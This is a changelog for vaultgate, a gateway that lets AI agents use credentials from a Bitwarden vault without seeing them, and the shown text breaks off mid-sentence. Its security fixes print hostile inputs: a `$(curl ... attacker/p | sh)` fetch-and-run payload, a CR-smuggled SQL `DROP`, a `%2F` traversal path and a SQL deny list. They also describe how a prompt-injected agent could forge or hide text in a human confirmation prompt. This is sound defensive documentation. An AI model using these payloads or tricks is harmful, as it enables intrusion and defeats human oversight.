# Changelog

All notable changes to this project are documented here. The format follows
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/) and the project uses
[Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Added

- ACT-106, ACT-113, ACT-117: **the `code` connector's sidecar**, under `sidecars/code/`: Python
  3.12 and `semble` 0.6.1 as a library, locked by hash with `uv`, and the embedding model pinned by
  revision and SHA-256. It extracts archives under the hostile-archive rules, builds indexes in a
  child process under disk and memory caps, and serves the protocol of
  [`sidecars/code/PROTOCOL.md`](sidecars/code/PROTOCOL.md) over a Unix socket or TCP, with no
  credential and no network. Its own suite holds 100% coverage; CI also builds and boots its image.

- M16, spec 14.8, ADR 0008: **the `code` connector: Semble code search over GitHub
  repositories**, with the arguments, defaults, ranking, snippet rule and multi-repository
  prefixes of `semble`'s own MCP server. A _Semble connection_ is one repository, a ref (the
  default branch when empty) and the vault field holding a read-only token, or none for a public
  repository. `code_search`, `code_find_related` and `code_read` (scope `actions:code`) take
  `repo`, a connection name or a list of up to ten, and an optional `ref`: a branch, a tag, a
  commit or `pr:<n>`, which resolves through `refs/pull/<n>/head` and so needs only
  `Contents: read`. vaultgate resolves the ref, downloads that commit's archive from GitHub
  through its pinned transport (the token to `api.github.com` only, one redirect to
  `codeload.github.com` without it) and streams it to the sidecar, which never sees a token; the
  first call on a commit waits for its index (ACT-103 to ACT-117). Every call is audited per
  repository, every build as `actions.code_index_built` or `actions.code_index_failed`, and the
  canary suite covers every tool result, audit row and log line.
- ACT-115, ACT-119, ACT-120: **the console's Semble · GitHub code search kind**. Add connection
  offers it as its own card and the Connections list groups it. Its form takes the repository from
  a list of every repository the chosen token can read (or a typed `owner/name`), a token field
  that defaults to `password`, lists hidden custom fields and offers **No token**, the content
  types, include and exclude patterns, whether `code_read` and a per-call ref are allowed, and the
  caps. **Check without saving** also asks GitHub whether the token can read the repository and
  shows its default branch and visibility. A connection's page gains an **Index** card (its
  snapshots, indexes, skip counts, the last ref resolution, build and failure) and **Rebuild
  index**, which needs the operator session but not re-authentication.
- ACT-114: **the sidecar in every placement.** `install.sh --with-code-sidecar` installs it as
  `vaultgate-code.service` under its own user, from a release bundle verified like the core
  tarball, with a virtual environment built from the hash-locked requirements and the model checked
  file by file; the unit has no network (`PrivateNetwork`, `IPAddressDeny=any`,
  `RestrictAddressFamilies=AF_UNIX`), full systemd sandboxing (`systemd-analyze security` scores
  it 0.3) and a socket only its group, which vaultgate's user joins, may open. Once installed, the
  installer upgrades it with the core. Compose has the optional `code` profile on an `internal`
  network, and the Azure template a `deployCodeSidecar` option that deploys a separate
  internal-ingress Container App. Each release publishes the signed `vaultgate-code` image and
  `vaultgate-code-<version>.tgz`, and attests the build provenance of both tarballs.
- [Code search](docs/guides/code-search.md), a new guide: the token, the sidecar, adding and
  granting a Semble connection, the tools, parity with `semble`'s MCP server and its two gaps
  (local paths and forges other than GitHub), and operating the index.

### Changed

- ACT-5: **the console calls a target a _connection_ rather than a _computer_**, since most
  targets are databases, APIs and servers. The sidebar entry, page titles and breadcrumbs read
  **Connections**; the button reads **Add connection**, and the list, its empty state, the
  notices, the create and edit forms, the target's page (**Delete connection**), the Agents page's
  **Who can use what** matrix, the Activity page and the guides and spec say _connection_ where
  they said _computer_. Nothing an operator or a script depends on moves: the routes under
  `/account/actions`, their query parameters and form fields, the audit event names and the
  spec's word _target_ are unchanged.

- ADR 0008, spec 14.8: **the planned `code` connector now matches `semble`'s own MCP server**, so
  a hosted agent searches the operator's GitHub repositories the way a local agent searches its
  checkout. `code_search` and `code_find_related` take `repo` (a connection name or a list of
  them, searched together with `semble`'s path prefixes), `top_k` (default 5), `content`
  (`code`, `docs`, `config` or `all`, per call, within the policy) and `max_snippet_lines`
  (`0`, `N` or `null`), and return `semble`'s own result fields; a call may name a `ref`,
  including `pr:<n>`. The first call on a commit waits for its index, indexes are kept per
  connection, commit and content selection under the sidecar's disk and memory caps, and the
  sidecar gains a systemd placement on a Unix socket in a private network namespace. The
  connector moves to its own file, [14a](docs/spec/14a-code-connector.md), with two new
  requirements for the console's repository picker and GitHub check (ACT-119, ACT-120) and two
  new error codes, `ref_not_found` and `chunk_not_found`.

- The changelog's 0.1.0-rc.7 to 0.1.0-rc.9 sections moved verbatim to
  [`docs/changelog-archive.md`](docs/changelog-archive.md), so `CHANGELOG.md` keeps room inside
  the 64 KiB file gate for the M16 entries.

## [0.1.0-rc.20] - 2026-09-25

### Added

- OAUTH-18: **the consent page offers the scopes the client did not ask for.** Claude on
  claude.ai follows the `WWW-Authenticate` challenge's `scope` hint and so requests `vault:read`
  alone, which left the operator no way to grant it an `actions:*` scope. Every other scope the
  deployment enables is now listed unticked under **Not requested**, and whatever the operator
  ticks is granted.

## [0.1.0-rc.19] - 2026-09-25

### Fixed

- ACT-57: **a PostgreSQL or SQL Server target in `verify-full` mode failed every call with
  `tls_error`** when its certificate authority was pasted into the console. The field was a
  single-line box, and a browser strips the line breaks from what is pasted there, so the stored
  PEM could not be read. The field is now a text area, and a save or check refuses a certificate
  authority that does not parse as PEM certificates, so the mistake shows at once rather than at
  the first call.

## [0.1.0-rc.18] - 2026-09-25

### Fixed

- OAUTH-7: **Claude Code could not sign in.** Its client metadata registers
  `http://localhost/callback` and it listens on a port chosen per sign-in, but the RFC 8252
  variable-port exception covered only `127.0.0.1` and `[::1]`, so the request was refused with
  `redirect_uri is not registered for this client`. The exception now covers `localhost` too, still
  only between URIs naming the same host, path and query.

## [0.1.0-rc.17] - 2026-09-25

### Fixed

- OAUTH-19, ID-19: **Allow on the consent page did nothing in a real browser.** The page's
  `form-action 'self'` also governs the redirects a form submission follows, so Chromium blocked
  the decision's `302` to the client (reporting the page's own URL), the code never reached the
  client, and a second press found the request spent (`this authorization request has expired`).
  The consent page now allows exactly its request's redirect origin in `form-action`; every other
  page keeps the strict policy.

## [0.1.0-rc.16] - 2026-09-25

### Fixed

- OAUTH-9, OAUTH-11: Claude could not connect. Its hosted client metadata document lists
  `urn:ietf:params:oauth:grant-type:jwt-bearer` beside `authorization_code` and `refresh_token`,
  and vaultgate refused the whole document with `invalid_client`. A grant type vaultgate does not
  offer is now dropped instead, in a hosted document and in a dynamic registration alike; the
  document must still list `authorization_code`, and the token endpoint still honours only the
  two grants it advertises.
- ID-25: the installer's closing message, the two environment examples, `llms.txt` and the Azure
  template's field descriptions still sent operators to "the account page" to connect the vault;
  since 0.1.0-rc.15 that is the console's Vault page, and they now say so.

## [0.1.0-rc.15] - 2026-09-24

### Added

- ACT-118: **checks as you go.** **Check without saving** on the create and edit forms runs every
  save-time check and saves nothing. It shows the address each host would be pinned to or why it
  is refused, whether the vault item is there, each mapped field on it (a secret one sealed), and
  every other problem, also beside its field. Unlike a save, it does not stop at a taken name.
  **Check now** on a computer's page runs the same checks on the saved computer at any time, so a
  moved DNS record or a changed vault item shows before an agent's call fails.
- ACT-1, ACT-2: **the address can come from the vault item.** Beside the address field, the form
  offers the item's login addresses and text fields; a host field takes the host and any port, a
  URL field a full `http://` or `https://` URL. On a new computer the first is chosen while nothing
  is typed. The address is copied into the computer when it is saved, so the private-range check
  and every confirmation stay bound to that address and a later change in the vault does not move
  it. A typed address that differs from the chosen one is refused rather than overridden.
- ACT-4, ACT-5: **choose the vault item by searching, and its fields from a list.** After the
  kind, **Add computer** asks which vault item signs in: search by name, username or address, or
  paste an id. Each result shows the item's login name, first address and fields, a secret field
  as a sealed chip bearing only its name. The form then offers the item's own fields for every
  mapping (the login name, the password, a key, a custom field), never their values, and flags a
  default the item does not carry. **Choose another item** on the edit page runs the same search.
  The vault is read for these steps only inside the password window, and only its metadata.
- VAULT-19, ID-25: **Sync now** on the Vault page syncs the vault at once instead of waiting
  for the next scheduled sync, so a change made in Bitwarden reaches agents straight away. It is
  offered while the vault is ready, needs the usual form checks but no password confirmation,
  joins a sync already running rather than starting a second, and records
  `vault.sync_requested`. The log's `vault synced` line says `kind: manual` for it.
- ID-19, ACT-5: **an operator console with a sidebar.** Every page a signed-in operator sees now
  shares one frame: a sidebar with **Computers** (one entry per kind, with counts), **Agents**,
  **Activity** and **Vault**, an **Add computer** button, the vault's state and the operator; a
  top bar with the breadcrumb and how long editing stays unlocked; and the page. The account page
  is split into pages of their own: `/account/agents` (connected agents, and a matrix of which
  agent may use which computer), `/account/activity` (recent calls, unexpected writes, audit
  export), `/account/vault` (the connection) and Account & security at `/account`. The Computers
  page groups targets by kind (SQL Server, PostgreSQL, Windows · WinRM, Linux · SSH, HTTP APIs,
  Microsoft Graph) and shows the vault item and fields each signs in with, secret fields as a
  sealed chip bearing only the name. **Add computer** chooses the kind first and fills in its
  defaults; a computer has a page of its own and a separate edit page. `GET /account/unlock`
  confirms the password for the page you were on and brings you back (ID-15). Still no
  JavaScript and one stylesheet, now with a dark scheme and stacked tables at phone width; type
  uses the system's fonts, since the CSP loads none.

### Changed

- ID-23: `/` and a sign-in with no return path lead to the Computers page when the actions layer
  is on, and to Agents otherwise, rather than to `/account`.
- ACT-9: grants are managed from each computer's page and from the Agents page's matrix; an
  agent's card lists its computers as links rather than carrying its own grant forms.
- ID-26: a signed-in operator with no e-mail address yet is sent to set one from every console
  page, the Computers pages included.

- ACT-92: the planned `browser` sidecar is deployed on Azure as a separate Container App with
  internal-only ingress, not as a second container of vaultgate's app. The containers of one app
  share a network namespace, and `bw serve` listens unauthenticated on that loopback, so a
  Chromium compromised by a hostile page could have reached the whole vault. This is the same
  rule ADR 0008 set for the `code` sidecar. T39 now covers both sidecars. Specification only;
  the connector lands with M15.

## [0.1.0-rc.14] - 2026-09-24

### Fixed

- ID-18, ID-19: **browser sign-in and consent were refused with a bare `403 Forbidden`.** Every
  page was served with `Referrer-Policy: no-referrer` (Hono's `secureHeaders` default), and under
  that policy a browser sends `Origin: null` on a form POST, which the origin check compared with
  the public URL and refused. Reproduced in Chromium 153 against the reference deployment; the
  suite never saw it because its browser double always sends a real `Origin`. Pages now send
  `Referrer-Policy: same-origin`, so a same-origin POST carries its origin and nothing leaks
  cross-origin, and an `Origin: null` is treated as absent so the browser-set
  `Sec-Fetch-Site: same-origin` decides (a cross-site `null` is still refused).

## [0.1.0-rc.13] - 2026-09-24

### Added

- ADR 0008 and spec 14.8 specify a seventh actions connector, `code`, planned for M16. It lets
  an agent search and read a private GitHub repository through `code_search`, `code_find_related`
  and `code_read` under a new `actions:code` scope, without holding the repository token.
  vaultgate resolves the ref and streams that commit's archive to a new optional sidecar, which
  builds a `semble` index in its own container with no credential and, in Compose, no route out.
  Spec 13 and 13a gain the scope, the tools, the configuration, the error codes, migration `005`
  and the amended non-goals. The threat model gains the snapshot as an asset and T38 to T44.
  `PLAN.md` gains M16.

### Changed

- The documentation leads with what vaultgate is now for: letting hosted agents use the
  credentials in a Bitwarden vault without ever seeing them, so no secret reaches the model's
  context or the chat transcript. The README, spec 01 (purpose and design principles 1 to 3 and
  6), the comparison page (a row for using a credential without seeing it; the command-execution
  row and the "secret injection" caveat restated against ADR 0007), the FAQ, the security model,
  `llms.txt`, `PLAN.md` and the `server.json` and `package.json` descriptions now describe the
  actions layer as the primary path and the vault tools as the audited fallback. Principle 6 now
  names the optional `browser` sidecar (ACT-91) that it previously ruled out. No behaviour
  changes.
- MCP-16: the instructions an agent receives when it connects now depend on its token. A token
  that holds an `actions:*` scope, on a deployment with the actions layer enabled, is told to
  list its targets and act through them, and to prefer an action to `get_secret` so that a
  credential it only needs to use never enters the conversation. Every other token gets the
  previous text unchanged.

## [0.1.0-rc.12] - 2026-09-24

### Added

- **`winrm` targets speak NTLMv2 over `Negotiate`, and it is now the default** (spec 14 §14.6,
  ACT-89). A stock Windows 10 or 11 machine runs one listener — HTTP on 5985, no certificate —
  with `Basic` disabled and `AllowUnencrypted` set to `false`, and answers `POST /wsman` with
  `401 WWW-Authenticate: Negotiate`. vaultgate now speaks exactly that, so **no change to the
  Windows host is required**: the password never crosses the network (NTLM answers a
  server-chosen challenge), and every SOAP message is sealed and signed with a session key
  derived from the exchange and wrapped in the MS-WSMV `multipart/encrypted` form, which is what
  `AllowUnencrypted=false` demands. Over `https://` the transport already encrypts and the
  envelope is sent as it is, with the ACT-57 certificate pin unchanged. NTLM authenticates the
  connection, so one socket carries the handshake and all six exchanges of a call.
- `destination.auth` on a `winrm` target: `negotiate` (new, the default) or `basic`, which is
  kept for a listener whose owner has deliberately enabled it. `basic` on an `http://` URL is
  refused at save — it is the one combination that really does send the password in the clear,
  and `negotiate` exists for that endpoint. The account may be a bare local name, `DOMAIN\name`
  or a user principal name.
- `src/crypto/md4.ts` and `src/crypto/rc4.ts`. **Both are broken primitives, and neither protects
  anything on its own; they are here because NTLM is defined in terms of them** — the NT hash is
  `MD4(UTF-16LE(password))` and `SEAL` is RC4 — **and OpenSSL 3 removed both from its default
  provider, so `node:crypto` cannot supply them.** What the exchange rests on is the
  challenge-response construction and the per-connection session key. vaultgate hashes nothing of
  its own with MD4 and encrypts nothing of its own with RC4; stored secrets still use
  AES-256-GCM. Each file says so at the top, ACT-89 records the reasoning, and each is proved
  against its own specification's vectors (RFC 1320; the published RC4 vectors) rather than
  against another implementation. The NTLMv2 responses, the four derived sub-keys and the message
  signature are proved against the worked example in MS-NLMP 4.2.4.
- Every byte of a challenge and of a `multipart/encrypted` reply is read as strictly as the XML
  reader reads a SOAP response (T33): bounds-checked offsets and lengths, a capped attribute
  list, the sealed payload located from the declared length rather than by hunting for a boundary
  inside bytes the destination chose, and anything malformed refused as `upstream_error` rather
  than worked around. A signature that does not verify fails the call; an answer sent in the
  clear where the exchange requires encryption is refused rather than read.
- `KeptConnection` in `src/net/`: one socket held across the requests of an authenticated
  session, released when the session ends. It now also remembers the leaf certificate its peer
  presented, which is the only place a later layer can read one.
- **`winrm` targets on an `https://` endpoint bind their NTLM exchange to the TLS connection**
  (spec 14 §14.6, ACT-89, threat T35). Nothing in an NTLM exchange names the channel it travels,
  so an attacker able to terminate TLS in front of the destination could relay the handshake and
  sign in as the operator's account elsewhere. The authenticate message now carries the RFC 5929
  `tls-server-end-point` channel binding in `MsvAvChannelBindings`: the leaf certificate the
  socket's peer actually presented, digested with SHA-384 or SHA-512 where the certificate is
  signed with one and SHA-256 otherwise, marshalled into the `gss_channel_bindings_struct` and
  MD5'd as MS-NLMP requires. Windows verifies it at its default `CbtHardeningLevel` of `Relaxed`,
  so there is **nothing to configure on the host**. A plain `http://` endpoint has no channel to
  bind to and sends no such attribute, which is correct — there the mitigation is that such a
  destination must be `internal: true` (ACT-56).
- The threat model covers the NTLM path: relay (T35), offline cracking of a captured exchange
  (T36) and the protocol-mandated weak primitives (T37), plus an on-path attacker to a
  destination, the MIC's dependence on the server's `MsvAvTimestamp`, and the accepted residual
  that NTLM is weaker than Kerberos. The actions guide now says plainly that a `winrm` account
  should be dedicated, low-privilege and given a long random password, for the same reason the
  `ssh` guidance insists on a restricted key.

### Fixed

- **The ACT-57 certificate pin did not take effect on the wire.** It was expressed as
  `agent: false` plus a `createConnection` in the request options, and Node ignores
  `options.createConnection` once a request has an agent — which `agent: false` gives it, a
  default agent whose sockets the system trust store verifies. A pinned destination presenting a
  self-signed certificate therefore failed with `DEPTH_ZERO_SELF_SIGNED_CERT` instead of being
  accepted by its pin, and one presenting a different CA-signed certificate would have been
  accepted by the store. The pin is now an agent of vaultgate's own whose `createConnection` is
  the corked, pin-checked socket, so the guard runs where it was always meant to. The existing
  test asserted the option shape rather than the mechanism Node uses, and was rewritten around
  the agent.

### Changed

- The `winrm` section of the actions guide is rewritten around `Negotiate`, since that is the
  path an operator will use; the `Basic` setup is kept as a short note for the case where someone
  wants it.
- The `winrm_run` tool description no longer says "over HTTPS", because it is no longer only
  HTTPS.
- **The actions guide now recommends an `https://` endpoint with the certificate pinned, and
  documents the plain listener as the fallback.** The previous ordering led with `negotiate` over
  `http://` because that is what reaches a stock host unmodified, which is right about
  reachability and wrong as security guidance: TLS covers the whole transport and authenticates
  the endpoint, where NTLM over 5985 seals the SOAP body and leaves the metadata in the clear.
  The usual objection — that the certificate will be self-signed, which makes the encryption
  theatre — is answered by `certificate_sha256`, and the guide now makes that argument rather
  than listing the options: the pin replaces the system store, is compared before anything is
  sent, and has no ignore-errors counterpart anywhere in the schema. The plain path keeps its
  section, including the measurement against an unmodified Windows 11 Pro machine that is the
  reason it exists, and what it does and does not protect is now stated explicitly.
- ACT-89 and the post-1.0 candidates in `PLAN.md` record Microsoft's phased removal of NTLM
  (deprecated June 2024; auditing today; IAKerb and a Local KDC in the second half of 2026;
  network NTLM blocked by default, which policy can still re-enable, in the next major Windows
  Server release) and name **Kerberos as the successor for `winrm`**, with IAKerb and the Local KDC as
  the trigger rather than a date. Nothing in the connector stops working: NTLM remains available
  by policy, and the blocking phase is a future server release.
- T37 and the header of `src/actions/connectors/winrm/ntlm/ntlmv2.ts` now cite RFC 6151 §2.3 for
  the HMAC-MD5 position — the attacks "do not seem to indicate a practical vulnerability when
  used as a message authentication code", and "it may not be urgent to remove HMAC-MD5 from the
  existing protocols", though a new design should not include it — because implementing an
  existing protocol is a stronger position than "the protocol made me". T37 also records why the
  CodeQL alerts are dismissed one at a time in public rather than filtered: a filter selects on
  query metadata rather than paths, so it would blind the whole repository to the rule, including
  a future misuse of MD5 somewhere it would matter.
- The guide warns that a remote PowerShell shell serialises its progress records as CLIXML on
  `stderr` while exiting 0 — `Get-ComputerInfo` emits several kilobytes of it — recommends
  `$ProgressPreference = 'SilentlyContinue'` where the target's policy allows the statement, and
  restates that `exit_code` is how a failure is told.

## [0.1.0-rc.11] - 2026-09-24

### Fixed

- VAULT-7: stopping vaultgate no longer logs a warning. The supervisor locks the vault on the way
  down, and by then the `bw serve` child is usually already gone, so the lock could not connect and
  was reported as `vault lock failed` at warning level on every upgrade — eleven times in the
  reference deployment's journal. A backend that has stopped cannot be locked and does not need to
  be, because its session went with the process, so that outcome is now recorded at information
  level as what it is. A vault that is reachable and refuses to lock is still a warning, because
  then something really did stay unlocked.

## [0.1.0-rc.10] - 2026-09-24

### Added

- A confirmation-message rendering test per connector (spec 13 §13.8, M14; ACT-43): the exact
  ACT-42 message for an `http` POST, a `sql_execute` statement, an `ssh_run` command and a
  `winrm_run` command, each asserted whole and asserted to contain no policy pattern (every
  target in the test carries one no call matches), no vault item id and no injected value. The
  vault is made to refuse everything first, so a message that survives proves the credential was
  never fetched (ACT-41). A statement longer than 1 KiB is cut at the first KiB, and `sql_query`
  — a read whatever the policy says — is never confirmed at all.
- `connectLegacySdkClient` in the test support: the real MCP client SDK on the 2025 wire, used by
  the ACT-76 cases below.

### Changed

- The changelog keeps the recent releases; 0.1.0-rc.1 to 0.1.0-rc.5 moved verbatim to
  `docs/changelog-archive.md`. The file had reached five bytes below the repository's 64 KiB
  file-size gate, so the next entry of any size would have failed the gate for whoever wrote it.
- **Spec ACT-48 is rewritten: there is no in-band elicitation fallback for the older protocol
  wire, and there cannot be one in this deployment model.** The clause previously required the
  engine to fall back to the SDK's server-to-client `elicitation/create` request when the
  negotiated revision predates the multi-round-trip pattern but the client declared `elicitation`
  at initialisation. Implementing it proved impossible under MCP-1's stateless handler, which
  builds a fresh server per HTTP request and so never sees `initialize` — the one place the older
  wire has to declare that capability. The SDK documents the same boundary on its per-request
  capability view ("per-request instances that never saw an initialize (stateless legacy) hold
  nothing, so gates refuse there"), and its legacy shim, asked to fulfil the request anyway,
  answers "no client capabilities are available on this connection — per-request legacy serving
  cannot receive server-to-client requests". Attempting the fallback is strictly worse than
  refusing: measured against a real SDK client on `2025-11-25`, it returns an untyped `isError`
  text result in place of the `confirmation_unavailable` code an agent can act on, writes no
  `action_calls` row at all, and still shows no human a prompt. The `confirmation_unavailable`
  refusal therefore stands, ACT-48 and ACT-76 now say why, `docs/PLAN.md`'s M14 entry is
  corrected, and the operator guides tell an operator what to do instead (a client on
  `2026-07-28`, or `confirm_writes: false` with the ACT-63 review). Two tests drive a real SDK
  client on the older wire and pin what it actually gets: the refusal, no prompt shown though the
  client offered to render one, the ACT-60 row written — and a read on the same target and the
  same wire still served, so the limit is the confirmation and nothing else.
- `docs/spec/12-compatibility.md` gains §12.2.1, a form-mode elicitation row per client. Only
  `@modelcontextprotocol/client` is marked supported, evidenced by the in-process suite that runs
  in CI; every product client is "not yet verified" rather than guessed, and the section says a
  row is filled in only from a run someone performed and recorded.

- Policy-form validation messages, the call-history and unexpected-write views, and grant
  management from the connected-clients list (spec 13 §13.3.2 and §13.12, M14; ACT-5, ACT-6,
  ACT-7, ACT-49, ACT-63). A target's page gains **The whole call history**, which pages back
  through its `action_calls` rows 50 at a time, newest first, on a keyset cursor so a page never
  shifts while rows are appended or retired. The Actions section gains **Unexpected writes**
  (`/account/actions/unexpected`): every call across every target that was not a read and whose
  elicitation did not end in an accepted confirmation, with the target, the client, the tool, the
  classification, the outcome and an excerpt of the stored — already scrubbed — arguments, so a
  target with `confirm_writes: false` is reviewable and a declined, cancelled, expired or refused
  confirmation on any other target is visible. Rows left behind by a deleted target keep its name
  without a link (ACT-8). A rejected save now shows each problem against the control it names,
  with an operator-facing sentence per policy field of every connector and the check's own detail
  in brackets; a problem that names no control — the destination as a whole, the vault item's
  fields — is still listed under the banner, so nothing is hidden. The account page's
  connected-clients list gains a **Targets** column with a Remove form per grant and a picker for
  the rest, injected by the composition layer so `src/oauth/` still knows nothing of the actions
  layer (ACT-70); it writes through the same service, the same ID-15 gate and the same ACT-7
  audit events as the target's own page. `confirm_writes` was already on by default in the form;
  a target that allows a non-read operation and has it turned off now carries a standing note
  saying what that means, which needed each connector to answer whether its policy allows
  anything but a read.
- `npm run check:requirements` (`scripts/check-requirement-citations.mjs`), part of
  `npm run quality`: every `ACT-n` the specification defines must be named by at least one test
  title. The `browser` requirements of M15 (ACT-29…33, ACT-91…102) are allowlisted inside the
  script with their reason; every other actions requirement is cited, and the gate fails if one
  loses its citation or if an allowlisted identifier leaves the specification.

- `winrm` connector runtime and `winrm_run` (spec 14 §14.6 and spec 13 §13.6.5, M13; ACT-27,
  ACT-28, ACT-89, ACT-90): the tool is listed on a deployment with `VAULTGATE_ENABLE_ACTIONS=true`
  and `VAULTGATE_ACTIONS_ENABLE_WINRM=true` for tokens holding `actions:winrm`. A `winrm` target
  names the WS-Management endpoint (`https://host:5986/wsman`; a plain `http://` one only on an
  `internal` target, which the save-time check insists on), the login name the command runs as,
  the shell (`powershell` by default, or `cmd`) and optionally the SHA-256 of the listener's leaf
  certificate. That pin replaces the system certificate store rather than adding to it, which is
  what a listener with its own certificate needs: the socket is held corked until the certificate
  presented matches, so nothing — least of all the credential — is sent to a host that fails the
  check, and a mismatch is `tls_error`. The credential is a password from the vault item, sent as
  `Basic` over TLS. The policy names either a list of command patterns or `any_command`, exactly
  as `ssh`. The WS-Management client is written here rather than taken from npm — the M13 spike
  compared the published clients against it and is recorded under M13 in `docs/PLAN.md` — so the
  connector adds no dependency: six SOAP exchanges (`Create` the shell, `Command`, `Send` for
  standard input, `Receive` polled until the command state is `Done`, `Signal terminate`,
  `Delete`) over the pinned transport, and a reader written for exactly the elements those
  responses carry, which refuses a DOCTYPE, an entity of any kind, a comment, a CDATA section, an
  over-deep or over-wide document and a stream that is not base64. A PowerShell command is sent as
  an `-EncodedCommand` with `WINRS_SKIP_CMD_SHELL`, so nothing re-parses the quoting the agent
  wrote; a `cmd` command is the command line `cmd.exe` parses. The policy timeout signals
  `terminate` and then deletes the shell, both on a short deadline of their own. Contract tests
  drive the connector against a fake WS-Management destination that scripts all six operations,
  asserts the exact `Command`, `Send` and `Signal` envelopes, polls slowly, faults, answers 401
  and a body that cannot be read, and echoes the password back for the canary suite. A JavaScript
  fault escaping the connector is `connector_fault`, never `upstream_error`. Operator
  guide: `docs/guides/actions.md` ("Creating a `winrm` target", "Calling a `winrm` target"); tool
  reference: `docs/guides/tools-and-scopes.md`.
- The account page can create and edit `winrm` targets, with the same standing warning on a
  target that allows any command (ACT-88).
- The pinned HTTPS transport can pin a destination to its leaf certificate
  (`src/net/certificate-pin.ts`, ACT-57). Only a caller that supplies a certificate check gets the
  behaviour; the CIMD fetcher and the `http` connector are unchanged and keep verifying against
  the system store.
- ACT-57, T33: the certificate guard treats a peer that presented no certificate as a failed
  pin rather than asking for the digest of nothing, which would have thrown inside the socket's
  own event listener, an uncaught exception rather than a failed call. The socket was already
  left corked, so no credential could have reached such a peer either way.

### Fixed

- **ACT-35, ACT-39, ACT-88: a wildcard in a command allowlist was an unrestricted shell.** `*`
  matches any run of characters, and `;`, `&&`, `|`, a backtick and `$( )` are characters, so a
  pattern could not restrain them: measured against the operator guide's own recommended
  patterns, `journalctl -u nginx --since *` admitted
  `journalctl -u nginx --since $(curl -s http://attacker/p | sh)`, and bounding the wildcard on
  both sides — the shape the guide presented as the safe idiom — did not help, because command
  substitution sits inside the run the `*` matches. Every `allowed_commands` target holding a
  wildcard was therefore an `any_command` target in practice, but without the deployment switch,
  the standing operator warning, `unrestricted: true` in `actions_list_targets` or the full
  command in `classification` — the whole of T24's command-allowlist mitigation, bypassed by
  punctuation. A command on a target that is not an any-command one may now contain no shell
  metacharacter (`;`, `&`, `|`, a backtick, `$`, `<`, `>`, `(`, `)`), exactly as it may contain
  no line break, and is refused with the new `policy_denied` reason `command_metacharacter`
  before anything connects. A pattern that holds one is refused at save, because no command that
  matched it could ever be allowed. The refusal is a runtime rule rather than a save-time
  warning because a warning would have had to fire on every wildcard, which is most of them: a
  wildcard is a legitimate way to fill in an argument, and it is now only that. The guide says
  what a `*` can and cannot do, including the residue a wildcard genuinely leaves — the rest of
  the allowed program's own command line, which needs no metacharacter — and the specification
  says what the code does.
- **ACT-42, ACT-43: the human confirmation prompt was silently truncated, and its trailer could
  be forged.** The prompt is what T24 relies on to stop a prompt-injected agent in front of an
  honest human, and a person who ticks a box for text whose dangerous clause was cut has been
  given the appearance of consent rather than the substance: a 1210-character command showed
  1024 characters with the tail invisible and nothing saying so. The summary is now the first
  768 characters and the last 192 — the tail is where an appended payload hides — and the
  message carries a line of vaultgate's own saying how many characters are missing and the
  SHA-256 of the whole operation. vaultgate does not refuse to confirm a long operation: refusing
  would push an operator towards `confirm_writes: false`, which is the weaker of the two states
  the clause exists to protect. Every line of the summary is now quoted with `>` and the message
  says so, so an agent can no longer reproduce the prompt's own trailer between the `\n\n`
  delimiters and make the message appear to end early — anything it wrote is a quoted line, and
  the trailer is the only unquoted one. On the audit side, an `arguments` value cut at the 4 KiB
  cap now says so in the stored text and carries the SHA-256 of the whole: `ssh` and `winrm` have
  ACT-88's full command in `classification`, but a 64 KiB `sql` statement had no fallback at all
  and hid its operative clause from the ACT-63 unexpected-write view.
- **ID-18: a synchroniser token of the same code-unit length but a different byte length crashed
  the route.** `timingSafeEqual` raises a `RangeError` on buffers of different lengths, so the
  comparison threw and the route answered `500` with no audit event, where ID-18 requires `403`
  with one — a silent gap in the trail is exactly what an operator needs to see. The comparison
  is over byte lengths now.
- **ID-24: a notice query parameter naming an inherited property crashed the page.** `/account`
  and `/account/actions/:id` indexed a plain object with the parameter, so `?notice=constructor`
  returned a function to the renderer and answered `500`. The lookup is an own-property one.
- **ID-19: the Actions pages inherited their CSP and `no-store` from identity's mount order.** The
  headers arrived only because `identity.routes` is mounted before the actions pages in
  `http/app.ts`. The pages now set them through the middleware identity hands the composition
  layer, and a test asserts both on every Actions page.
- **ACT-53: a driver message reached the log unscrubbed on one path in `sql` and `winrm`.** pino's
  OPS-1 redaction works by field name, so the free-text reason logged when a session would not
  close or a shell would not delete was the one place upstream text left those connectors without
  passing the call's scrub table. `RunSupport` gains `scrub`, which both now use. The `winrm`
  half also logged only the fixed §13.16 sentence rather than the service's own words, so it said
  nothing an operator could act on; it now reports the fault's reason, scrubbed.
- Performance, not a defect: `engine-run` scrubbed every captured stream twice, once in the
  capture pass and again in the deep pass over the merged result — about 166 ms per MiB with a
  four-secret table, on the event loop that also serves OAuth and the operator pages. Only the
  connector's own result fields go through the deep pass now, and the scrubber skips a position
  no variant can begin at, which is nearly all of them.
- **ACT-51, ACT-52, ACT-53: a body that was not text defeated the scrubber.** The `http`
  connector base64-encoded the body itself; base64 is positional, so no ACT-51 variant matched
  and the credential came back verbatim under `body_encoding`, at any offset. Connectors no
  longer encode: `Scrubber` gains `bytes` and `base64`, `ConnectorOutput` a `base64` list, and
  the engine scrubs raw bytes before it encodes and cuts. `sql`'s binary columns are closed the
  same way and `Scrubber.buffer` scrubs bytes too. Every connector with a body has a non-textual
  canary test, against an `http` fake that can now answer arbitrary bytes under a chosen type.
- **ACT-36: a bare carriage return smuggled a second statement past the SQL classifier.** A `--`
  comment ends at a bare CR on both engines but ran to `\n` here, so `SELECT 1 --x\r; DROP t`
  classified `read`. It now ends at either terminator, and ACT-34's command `*` stops at CR too,
  so an allowlist pattern cannot span a line the server splits. A `statement` may
  no longer carry a NUL or other C0 control character but tab, CR and LF, as ACT-27 requires of a
  `command` (ACT-23), and `DBCC`, `WRITETEXT`, `UPDATETEXT` and `READTEXT` join ACT-37's deny
  set, an omission corrected in both places.
- **ACT-51: the `winrm` `Basic` pair was never scrubbed.** Its login name is in the
  destination, so the engine built the scrub table without one and never made the
  `base64(username:password)` variant it sends; a listener echoing that header back in a fault
  leaked the pair. `ConnectorSchemas` gains `basicUsername`.
- **ACT-20, ACT-35: `%2F` in a path walked past `allowed_paths`.** Normalisation decodes
  unreserved characters only, so `/orders/..%2F..%2Fadmin%2Fusers` matched `/orders/*` and
  reached the wire unchanged. Both are now refused in the path, not the query.
- ACT-88: a target submission naming a deployment-gated policy field is now refused and told why,
  instead of being dropped in silence. The account page does not draw the any-command field where
  `VAULTGATE_ACTIONS_ALLOW_ANY_COMMAND` is off, so an ordinary browser never sends one; a
